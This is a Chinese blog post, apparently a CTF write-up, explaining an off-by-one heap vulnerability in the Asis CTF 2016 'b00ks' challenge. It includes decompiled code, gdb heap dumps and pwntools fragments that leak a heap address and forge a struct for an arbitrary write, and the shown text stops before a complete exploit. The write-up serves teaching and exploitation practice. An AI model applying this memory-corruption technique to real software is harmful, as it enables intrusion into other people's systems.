@@ -1,0 +1,486 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="简述off_by_oneoff_by_one指的就是一个字节的缓冲区溢出，常见的比如for循环中边界检查不当，还有strcpy函数在字符串尾部加上了一个结束符等等所造成的一个字节的溢出。 稍微特殊一点的情况就是单个NULL字节的溢出，比如上述的strcpy函数所造成的溢出就属于单个NULL字节的溢出，我们把这种特殊情况称为 NULL byte off-by-one 或者 off-by-NULL A">
+<meta property="og:type" content="article">
+<meta property="og:title" content="堆利用-off_by_one">
+<meta property="og:url" content="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/05/%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one/index.html">
+<meta property="og:site_name" content="CharonPt的Blog">
+<meta property="og:description" content="简述off_by_oneoff_by_one指的就是一个字节的缓冲区溢出，常见的比如for循环中边界检查不当，还有strcpy函数在字符串尾部加上了一个结束符等等所造成的一个字节的溢出。 稍微特殊一点的情况就是单个NULL字节的溢出，比如上述的strcpy函数所造成的溢出就属于单个NULL字节的溢出，我们把这种特殊情况称为 NULL byte off-by-one 或者 off-by-NULL A">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-05-05T10:01:07.000Z">
+<meta property="article:modified_time" content="2022-05-05T16:07:38.893Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="堆">
+<meta property="article:tag" content="off_by_one">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/05/%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>堆利用-off_by_one | CharonPt的Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">CharonPt的Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/05/05/%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CharonPt的Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          堆利用-off_by_one
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-05-05 18:01:07" itemprop="dateCreated datePublished" datetime="2022-05-05T18:01:07+08:00">2022-05-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-06 00:07:38" itemprop="dateModified" datetime="2022-05-06T00:07:38+08:00">2022-05-06</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="简述off-by-one"><a href="#简述off-by-one" class="headerlink" title="简述off_by_one"></a>简述off_by_one</h3><p>off_by_one指的就是一个字节的缓冲区溢出，常见的比如for循环中边界检查不当，还有strcpy函数在字符串尾部加上了一个结束符等等所造成的一个字节的溢出。</p>
+<p>稍微特殊一点的情况就是单个NULL字节的溢出，比如上述的strcpy函数所造成的溢出就属于单个NULL字节的溢出，我们把这种特殊情况称为 NULL byte off-by-one 或者 off-by-NULL</p>
+<h2 id="Asis-CTF-2016-b00ks"><a href="#Asis-CTF-2016-b00ks" class="headerlink" title="Asis CTF 2016 b00ks"></a>Asis CTF 2016 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">b00ks</a></h2><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>具有off-by-one漏洞的函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">my_read</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, a1, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *a1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++a1;</span><br><span class="line">    <span class="keyword">if</span> ( i == a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们仔细思考就会发现这个函数其实是不合理的（或者说是有问题的），比如我们传进该函数的长度为32，当我们输入完第32个字符的时候，a1实际指向了<code>传入的地址+32个字节</code>处， 这个地址实际上已经超出了传入的长度，最后<code>*a1 = 0</code>就造成了off-by-one</p>
+<p>回到程序，在程序的开始首先会要求输入<code>author name</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_B6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter author name: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !my_read(off_202018, <span class="number">32LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fail to read author_name&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到这里<code>my_read</code>的第一个参数是<code>off_202018</code>，在ida中看一看这个地方的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000202008 ; void *off_202008</span><br><span class="line">.data:0000000000202008 off_202008      dq offset off_202008    ; DATA XREF: sub_980+17↑r</span><br><span class="line">.data:0000000000202008                                         ; .data:off_202008↓o</span><br><span class="line">.data:0000000000202010 off_202010      dq offset unk_202060    ; DATA XREF: sub_B24:loc_B38↑o</span><br><span class="line">.data:0000000000202010                                         ; delete:loc_C1B↑o ...</span><br><span class="line">.data:0000000000202018 off_202018      dq offset unk_202040    ; DATA XREF: change_author+15↑o</span><br><span class="line">.data:0000000000202018                                         ; show+CA↑o</span><br></pre></td></tr></table></figure>
+
+<p>可以看到<code>off_202018</code>的这个指针保存的是<code>unk_202040</code>的值，<code>unk_202040</code>其实就是与程序基址偏移为<code>0x202040</code>的地址，这个地址在<code>.bss</code>段中，所以我们输入的author name保存在了<code>unk_202040</code>这个地址里。</p>
+<p>然后进入菜单</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. Create a book</span><br><span class="line">2. Delete a book</span><br><span class="line">3. Edit a book</span><br><span class="line">4. Print book detail</span><br><span class="line">5. Change current author name</span><br><span class="line">6. Exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>Create a book</code>中要求输入book的名字（限制最长为32字节）跟内容（无长度限制），book的名字跟内容都分别申请了一个对应大小的chunk来储存，并且在最后申请了一个0x20大小的chunk来存储这个book的相关信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">book_struct = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);        <span class="comment">// 用一个0x20的chunk来保存book的相关信息</span></span><br><span class="line"><span class="keyword">if</span> ( book_struct )</span><br><span class="line">&#123;</span><br><span class="line">	*(book_struct + <span class="number">3</span>) = v1;			<span class="comment">//v1是content的大小</span></span><br><span class="line">	*(off_202010 + v2) = book_struct;	<span class="comment">//将指针保存到*(off_202010+v2)处</span></span><br><span class="line">	*(book_struct + <span class="number">2</span>) = content;		<span class="comment">//content是存储book的内容的chunk指针</span></span><br><span class="line">	*(book_struct + <span class="number">1</span>) = name;			<span class="comment">//name是存储book的名字的chunk指针</span></span><br><span class="line">	*book_struct = ++book_num;			<span class="comment">//*book_struct是该book对应的id</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在这里我们也要注意，<code>*(off_202010 + v2) = book_struct;</code>这条指令是将<code>book_struct</code>指针保存到<code>off_202010 </code>这个指针所指向的地址+v2个指针类型长度处（这里为v2个8字节），具体的可以从下面这段汇编看出来。（为什么要强调这个呢因为我个人基础不是很好所以写的时候复习一下）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000000112E                 lea     rax, off_202010</span><br><span class="line">.text:0000000000001135                 mov     rax, [rax]</span><br><span class="line">.text:0000000000001138                 mov     edx, [rbp+v2]</span><br><span class="line">.text:000000000000113B                 movsxd  rdx, edx</span><br><span class="line">.text:000000000000113E                 shl     rdx, 3</span><br><span class="line">.text:0000000000001142                 add     rdx, rax</span><br><span class="line">.text:0000000000001145                 mov     rax, [rbp+book_struct]</span><br><span class="line">.text:0000000000001149                 mov     [rdx], rax</span><br></pre></td></tr></table></figure>
+
+<p>delete函数正常释放<code>book_struct、content、name</code>指针，并且将<code>off_202010 + v2</code>上的指针置零，不存在uaf漏洞。</p>
+<p>edit函数根据<code>book_struct</code>指针去修改book的内容</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter the book id you want to edit: &quot;</span>);</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">......</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Enter new book description: &quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !my_read(*(*(off_202010 + i) + <span class="number">16LL</span>), *(*(off_202010 + i) + <span class="number">24LL</span>) - <span class="number">1</span>) )</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>printf功能函数</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = *(off_202010 + i);</span><br><span class="line">    <span class="keyword">if</span> ( v0 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;ID: %d\n&quot;</span>, **(off_202010 + i));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Name: %s\n&quot;</span>, *(*(off_202010 + i) + <span class="number">8LL</span>));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Description: %s\n&quot;</span>, *(*(off_202010 + i) + <span class="number">16LL</span>));</span><br><span class="line">      LODWORD(v0) = <span class="built_in">printf</span>(<span class="string">&quot;Author: %s\n&quot;</span>, off_202018);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后一个修改author name的功能</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_B6D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter author name: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !my_read(off_202018, <span class="number">32LL</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;fail to read author_name&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>（本题在 Ubuntu16.04 下复现）</p>
+<p>程序最开始要求输入的author name的长度为0x20个字节，并且输入在<code>unk_202040</code>处，因为是用有off-by-one漏洞的<code>my_read</code>函数输入的，所以如果我们输入的author name有32个字节的话，那么结束符就会在<code>unk_202040+0x20</code>处，同时我们要注意的是用来保存book的相关信息的chunk的指针<code>book_struct</code>保存在了<code>*(off_202010 + v2)</code>处（详见上述题目处），也就是<code>unk_202060+v2*8</code>处。所以第一个book的<code>book_struct</code>指针就写在了<code>unk_202060</code>处，那么这时就产生了一个问题</p>
+<ol>
+<li>当我们输入的author name长度为32个字节的时候，author name的结束符会被第一个book的<code>book_struct</code>指针覆盖掉</li>
+<li>因为程序提供的功能中有修改author name这一功能，所以我们还可以通过修改author name从而让结束符覆盖掉第一个book的<code>book_struct</code>指针的低一字节。</li>
+</ol>
+<p>我们可以利用1来泄漏heap地址（因为show()函数会打印author name），利用2来修改堆指针。</p>
+<p>一步一步来，我们先申请一个name_size = 0x20，content_size = 0x40的book</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p.sendlineafter(<span class="string">&quot;Enter author name:&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;book1&#x27;</span>,<span class="number">0x40</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后进gdb看看</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x561ece378040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x561ece378050:	0x6161616161616161	0x6161616161616161		==&gt;这32个字节是aunthor name</span><br><span class="line">0x561ece378060:	0x0000561ecf2be0a0	0x0000000000000000		==&gt;这里开始保存book_struct指针</span><br></pre></td></tr></table></figure>
+
+<p>我们再看看此时的堆结构</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ heap</span><br><span class="line">0x561ecf2bd000 PREV_INUSE &#123;			#程序自己申请0x1010个字节的chunk</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x1011, </span><br><span class="line">  fd = 0xa3436, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x561ecf2be010 FASTBIN &#123;		#这个chunk用来保存book_name</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x31, </span><br><span class="line">  fd = 0x316b6f6f62, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x561ecf2be040 FASTBIN &#123;		#这个chunk用来保存book_content</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x51, </span><br><span class="line">  fd = 0x61616161, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x561ecf2be090 FASTBIN &#123;		#这个就是book_struct指向的chunk</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x31, </span><br><span class="line">  fd = 0x1, </span><br><span class="line">  bk = 0x561ecf2be020, </span><br><span class="line">  fd_nextsize = 0x561ecf2be050, </span><br><span class="line">  bk_nextsize = 0x40</span><br><span class="line">&#125;</span><br><span class="line">0x561ecf2be0c0 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0x0, </span><br><span class="line">  size = 0x20f41, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面是book_struct的具体内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x0000561ecf2be0a0</span><br><span class="line">0x561ecf2be0a0:	0x0000000000000001	0x0000561ecf2be020	#id 	book_name的指针</span><br><span class="line">0x561ecf2be0b0:	0x0000561ecf2be050	0x0000000000000040	#book_content的指针   content大小</span><br></pre></td></tr></table></figure>
+
+<p>到这里开始就是重点了，首先我们应该注意到的是edit函数是怎样修改book的内容的，<code>my_read(*(*(off_202010 + i) + 16LL), *(*(off_202010 + i) + 24LL) - 1)</code></p>
+<p>这个函数其实就是利用了保存在<code>*(off_202010 + i)</code>处的指针来分别读取book_content指针以及content的size。如果我们能把<code>*(off_202010 + i)</code>处的指针覆盖成<code>book_content</code>指针的话，那么edit函数不就相当于读取<code>*(book_content)+16</code>处的值来作为第一个参数，取<code>*(book_content)+24</code>处的值来作为第二个参数了吗？而我们又知道<code>*(book_content)+16</code>和<code>*(book_content)+24</code>处的值是直接由我们控制的，所以我们就相当于有了一个任意地址写。</p>
+<p>那么现在的问题就是，怎么把保存在<code>*(off_202010 + i)</code>处的指针覆盖成<code>book_content</code>指针？</p>
+<p>这其实很简单，我们只需要让book_content稍微大一点，让<code>book_struct</code>的低一字节被覆盖成‘\x00’后的这个地址的+16和+24处的内容是能被我们控制的即可。</p>
+<p>比如说我们创建的第一个book是这样的话</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;book1&#x27;</span>,<span class="number">0xf0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>那么<code>book_struct = 0x000055b4705d9150</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x55b46ee78040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b46ee78050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55b46ee78060:	0x000055b4705d9150	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>我们用author name的结束符将其低一字节覆盖成’\x00’后就等于<code>0x000055b4705d9100</code>，而这个地址显然属于我们book_content的一部分，也就是说这个地址附近的内容都是受我们控制的，那么我们就可以在这上面伪造一个book_struct，从而在edit函数中达到任意地址写的目的。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#part of leak heap_base</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Enter author name:&quot;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;book1&#x27;</span>,<span class="number">0xf0</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">32</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - <span class="number">0x1150</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base = &quot;</span>,<span class="built_in">hex</span>(heap_base)</span><br><span class="line"></span><br><span class="line"><span class="comment">#part of 任意地址写</span></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">0x16</span> + p64(<span class="number">1</span>)*<span class="number">2</span> + p64(heap_base) + p64(<span class="number">0x40</span>)) <span class="comment">#这里我们伪造了book_id、book_content指针和content_size，book_name没有伪造所以打印book1的name时会报错</span></span><br><span class="line">chang_author_name(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>) <span class="comment">#这里我们用author name的结束符覆盖book_struct指针</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;ccccccc&#x27;</span>) <span class="comment">#我们再次修改book1的content，实际上修改的是我们想要写的地址</span></span><br></pre></td></tr></table></figure>
+
+<p>这里举个例子，我们想往heap_base这个地址里写值，我们如上构造，然后重头来看一遍</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/32gx 0x55a36a56a040</span><br><span class="line">0x55a36a56a040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a36a56a050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55a36a56a060:	0x000055a36b2bc150	0x0000000000000000</span><br></pre></td></tr></table></figure>
+
+<p>此时<code>book_struct = 0x000055a36b2bc150 </code>，我们在<code>0x000055a36b2bc100</code>处伪造好<code>book_struct</code>结构之后再覆盖掉<code>book_struct</code>的低一字节，如下</p>
